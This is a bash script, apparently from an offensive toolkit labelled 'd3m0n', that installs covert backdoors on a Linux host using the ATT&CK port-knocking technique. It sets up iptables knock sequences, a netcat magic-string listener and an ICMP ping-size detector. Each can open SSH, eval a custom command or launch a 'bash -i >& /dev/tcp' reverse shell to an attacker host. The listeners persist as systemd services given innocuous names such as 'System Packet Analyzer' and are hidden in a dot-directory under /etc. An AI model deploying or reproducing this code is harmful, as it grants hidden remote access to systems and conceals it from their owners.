#!/bin/bash
#
# socket_filter.sh — T1205.002 Port Knocking / BPF Socket Filter
#
# Implements port knock sequences, single-packet auth, and ICMP knocking
# to trigger hidden actions (open port, reverse shell, enable SSH).
#

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

KNOCK_DIR="/etc/.d3m0n_knock"
KNOCK_SCRIPT="${KNOCK_DIR}/knockd.sh"
KNOCK_SERVICE="/etc/systemd/system/d3m0n-knockd.service"
BACKUP_IPTABLES="${KNOCK_DIR}/iptables.bak"

banner_knock() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════════════╗"
    echo "  ║   T1205.002 — Port Knocking / Socket Filter Backdoor  ║"
    echo "  ║   Knock sequence → trigger hidden action              ║"
    echo "  ╚═══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Root required.${NC}"
        return 1
    fi
    return 0
}

# ── [1] Classic Port Knock (iptables-based) ──
classic_knock() {
    check_root || return 1

    echo -e "${CYAN}[*] Classic Port Knock — iptables recent module${NC}"
    echo -e "${YELLOW}[?] Knock sequence (3-5 ports, space-separated, e.g. '7000 8000 9000'):${NC}"
    read -r KNOCK_SEQ
    echo -e "${YELLOW}[?] Protected port to open on successful knock (e.g. 22):${NC}"
    read -r PROTECTED_PORT
    echo -e "${YELLOW}[?] How long to keep port open in seconds [default: 30]:${NC}"
    read -r OPEN_TIME
    OPEN_TIME="${OPEN_TIME:-30}"

    if [[ -z "$KNOCK_SEQ" || -z "$PROTECTED_PORT" ]]; then
        echo -e "${RED}[!] Sequence and port required.${NC}"
        return 1
    fi

    local -a PORTS=($KNOCK_SEQ)
    local NUM_KNOCKS=${#PORTS[@]}

    if [[ $NUM_KNOCKS -lt 2 || $NUM_KNOCKS -gt 5 ]]; then
        echo -e "${RED}[!] Need 2-5 ports in knock sequence.${NC}"
        return 1
    fi

    mkdir -p "$KNOCK_DIR" 2>/dev/null

    # Backup current iptables
    iptables-save > "$BACKUP_IPTABLES" 2>/dev/null

    # Drop the protected port by default
    iptables -A INPUT -p tcp --dport "$PROTECTED_PORT" -j DROP 2>/dev/null

    # Build knock chain
    local i=1
    for port in "${PORTS[@]}"; do
        if [[ $i -eq 1 ]]; then
            # First knock
            iptables -A INPUT -p tcp --dport "$port" -m recent --name KNOCK1 --set -j DROP
        elif [[ $i -eq $NUM_KNOCKS ]]; then
            # Last knock — open the port
            iptables -A INPUT -p tcp --dport "$port" -m recent --name "KNOCK$((i-1))" --rcheck --seconds 10 \
                -j LOG --log-prefix "D3M0N_KNOCK_OK: "
            iptables -I INPUT -p tcp --dport "$PROTECTED_PORT" -m recent --name "KNOCK${i}" --rcheck --seconds "$OPEN_TIME" -j ACCEPT
            iptables -A INPUT -p tcp --dport "$port" -m recent --name "KNOCK$((i-1))" --rcheck --seconds 10 \
                -m recent --name "KNOCK${i}" --set -j DROP
        else
            # Middle knocks
            iptables -A INPUT -p tcp --dport "$port" -m recent --name "KNOCK$((i-1))" --rcheck --seconds 10 \
                -m recent --name "KNOCK${i}" --set -j DROP
        fi
        i=$((i + 1))
    done

    echo -e "${GREEN}[+] Port knock installed!${NC}"
    echo -e "${YELLOW}[*] Sequence: ${KNOCK_SEQ}${NC}"
    echo -e "${YELLOW}[*] Protected port: ${PROTECTED_PORT} (opens for ${OPEN_TIME}s after correct knock)${NC}"
    echo -e "${YELLOW}[*] To knock from client: for p in ${KNOCK_SEQ}; do nmap -Pn --host-timeout 100 --max-retries 0 -p \$p TARGET; done${NC}"
}

# ── [2] Single-Packet Auth (magic payload on specific port) ──
single_packet_auth() {
    check_root || return 1

    echo -e "${CYAN}[*] Single-Packet Authentication — magic payload triggers action${NC}"
    echo -e "${YELLOW}[?] Listen port [default: 53]:${NC}"
    read -r SPA_PORT
    SPA_PORT="${SPA_PORT:-53}"
    echo -e "${YELLOW}[?] Magic string (secret passphrase):${NC}"
    read -r MAGIC_STRING
    echo -e "${YELLOW}[?] Action on auth:${NC}"
    echo "  [1] Open SSH (port 22) for 60 seconds"
    echo "  [2] Reverse shell to specified host"
    echo "  [3] Custom command"
    read -r ACTION

    if [[ -z "$MAGIC_STRING" ]]; then
        echo -e "${RED}[!] Magic string required.${NC}"
        return 1
    fi

    local ACTION_CMD=""
    case "$ACTION" in
        1) ACTION_CMD="iptables -I INPUT -p tcp --dport 22 -j ACCEPT; sleep 60; iptables -D INPUT -p tcp --dport 22 -j ACCEPT" ;;
        2)
            echo -e "${YELLOW}[?] Reverse shell host:port (e.g. 10.0.0.1:4444):${NC}"
            read -r RSHELL
            local RHOST="${RSHELL%%:*}"
            local RPORT="${RSHELL##*:}"
            ACTION_CMD="bash -i >& /dev/tcp/${RHOST}/${RPORT} 0>&1"
            ;;
        3)
            echo -e "${YELLOW}[?] Custom command:${NC}"
            read -r ACTION_CMD
            ;;
        *) echo -e "${RED}[!] Invalid.${NC}"; return 1 ;;
    esac

    mkdir -p "$KNOCK_DIR" 2>/dev/null

    # Create the SPA listener script
    cat > "${KNOCK_DIR}/spa_listener.sh" << SPAEOF
#!/bin/bash
# Single-Packet Authentication listener
MAGIC="${MAGIC_STRING}"
PORT="${SPA_PORT}"

while true; do
    DATA=\$(ncat -l -p "\$PORT" -w 5 2>/dev/null || nc -l -p "\$PORT" -w 5 2>/dev/null)
    if [[ "\$DATA" == *"\$MAGIC"* ]]; then
        ${ACTION_CMD} &
    fi
done
SPAEOF
    chmod 700 "${KNOCK_DIR}/spa_listener.sh"

    # Create systemd service for persistence
    cat > "${KNOCK_DIR}/spa.service" << SVCEOF
[Unit]
Description=System Packet Analyzer
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash ${KNOCK_DIR}/spa_listener.sh
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
SVCEOF

    cp "${KNOCK_DIR}/spa.service" /etc/systemd/system/d3m0n-spa.service 2>/dev/null
    systemctl daemon-reload 2>/dev/null
    systemctl enable d3m0n-spa.service 2>/dev/null
    systemctl start d3m0n-spa.service 2>/dev/null

    echo -e "${GREEN}[+] SPA listener active on port ${SPA_PORT}${NC}"
    echo -e "${YELLOW}[*] To authenticate: echo '${MAGIC_STRING}' | nc -w1 TARGET ${SPA_PORT}${NC}"
}

# ── [3] ICMP Knock (specific ICMP payload sizes) ──
icmp_knock() {
    check_root || return 1

    echo -e "${CYAN}[*] ICMP Knock — sequence of ping sizes triggers action${NC}"
    echo -e "${YELLOW}[?] ICMP payload sizes (space-separated, e.g. '64 128 256 512'):${NC}"
    read -r ICMP_SEQ
    echo -e "${YELLOW}[?] Action on successful knock:${NC}"
    echo "  [1] Open SSH for 60 seconds"
    echo "  [2] Reverse shell"
    echo "  [3] Custom command"
    read -r ACTION

    if [[ -z "$ICMP_SEQ" ]]; then
        echo -e "${RED}[!] Sequence required.${NC}"
        return 1
    fi

    local ACTION_CMD=""
    case "$ACTION" in
        1) ACTION_CMD="iptables -I INPUT -p tcp --dport 22 -j ACCEPT; sleep 60; iptables -D INPUT -p tcp --dport 22 -j ACCEPT" ;;
        2)
            echo -e "${YELLOW}[?] Reverse shell host:port:${NC}"
            read -r RSHELL
            ACTION_CMD="bash -i >& /dev/tcp/${RSHELL%%:*}/${RSHELL##*:} 0>&1"
            ;;
        3) echo -e "${YELLOW}[?] Command:${NC}"; read -r ACTION_CMD ;;
        *) echo -e "${RED}[!] Invalid.${NC}"; return 1 ;;
    esac

    mkdir -p "$KNOCK_DIR" 2>/dev/null

    local -a SIZES=($ICMP_SEQ)
    local SIZES_STR="${SIZES[*]}"

    cat > "${KNOCK_DIR}/icmp_knock.sh" << 'ICMPEOF'
#!/bin/bash
# ICMP Knock Detector
EXPECTED_SIZES=(SIZES_PLACEHOLDER)
ACTION_CMD="ACTION_PLACEHOLDER"
TIMEOUT=10
KNOCK_STATE=0
LAST_TIME=$(date +%s)

tcpdump -lni any icmp 2>/dev/null | while IFS= read -r line; do
    SIZE=$(echo "$line" | grep -oP 'length \K[0-9]+')
    [[ -z "$SIZE" ]] && continue

    NOW=$(date +%s)
    if (( NOW - LAST_TIME > TIMEOUT )); then
        KNOCK_STATE=0
    fi
    LAST_TIME=$NOW

    EXPECTED="${EXPECTED_SIZES[$KNOCK_STATE]}"
    if [[ "$SIZE" == "$EXPECTED" ]]; then
        KNOCK_STATE=$((KNOCK_STATE + 1))
        if [[ $KNOCK_STATE -eq ${#EXPECTED_SIZES[@]} ]]; then
            eval "$ACTION_CMD" &
            KNOCK_STATE=0
        fi
    else
        KNOCK_STATE=0
    fi
done
ICMPEOF

    sed -i "s|SIZES_PLACEHOLDER|${SIZES_STR}|" "${KNOCK_DIR}/icmp_knock.sh"
    sed -i "s|ACTION_PLACEHOLDER|${ACTION_CMD}|" "${KNOCK_DIR}/icmp_knock.sh"
    chmod 700 "${KNOCK_DIR}/icmp_knock.sh"

    # Systemd service
    cat > /etc/systemd/system/d3m0n-icmpknock.service << SVCEOF
[Unit]
Description=ICMP Network Monitor
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash ${KNOCK_DIR}/icmp_knock.sh
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
SVCEOF

    systemctl daemon-reload 2>/dev/null
    systemctl enable d3m0n-icmpknock.service 2>/dev/null
    systemctl start d3m0n-icmpknock.service 2>/dev/null

    echo -e "${GREEN}[+] ICMP knock listener active!${NC}"
    echo -e "${YELLOW}[*] Knock sequence sizes: ${ICMP_SEQ}${NC}"
    echo -e "${YELLOW}[*] To knock: for s in ${ICMP_SEQ}; do ping -c1 -s \$s TARGET; sleep 1; done${NC}"
}

# ── [4] Cleanup ──
cleanup_knock() {
    check_root || return 1

    echo -e "${CYAN}[*] Removing port knock / SPA persistence...${NC}"

    # Stop and remove services
    for svc in d3m0n-knockd d3m0n-spa d3m0n-icmpknock; do
        systemctl stop "${svc}.service" 2>/dev/null
        systemctl disable "${svc}.service" 2>/dev/null
        rm -f "/etc/systemd/system/${svc}.service" 2>/dev/null
    done
    systemctl daemon-reload 2>/dev/null

    # Restore iptables if backup exists
    if [[ -f "$BACKUP_IPTABLES" ]]; then
        iptables-restore < "$BACKUP_IPTABLES" 2>/dev/null
        echo -e "${GREEN}  [+] Iptables restored from backup${NC}"
    fi

    # Remove knock directory
    if [[ -d "$KNOCK_DIR" ]]; then
        rm -rf "$KNOCK_DIR"
        echo -e "${GREEN}  [+] Removed: ${KNOCK_DIR}${NC}"
    fi

    echo -e "${GREEN}[+] Port knock persistence removed.${NC}"
}

# ── MAIN MENU ──
main_menu() {
    banner_knock
    echo -e "  ${CYAN}[1]${NC} Classic port knock (iptables recent module)"
    echo -e "  ${CYAN}[2]${NC} Single-packet authentication (magic payload)"
    echo -e "  ${CYAN}[3]${NC} ICMP knock (ping size sequence)"
    echo -e "  ${CYAN}[4]${NC} Cleanup / Remove all knock persistence"
    echo ""
    echo -e "${YELLOW}[?] Select option:${NC} "
    read -r OPT

    case "$OPT" in
        1) classic_knock ;;
        2) single_packet_auth ;;
        3) icmp_knock ;;
        4) cleanup_knock ;;
        *) echo -e "${RED}[!] Invalid option.${NC}" ;;
    esac
}

main_menu
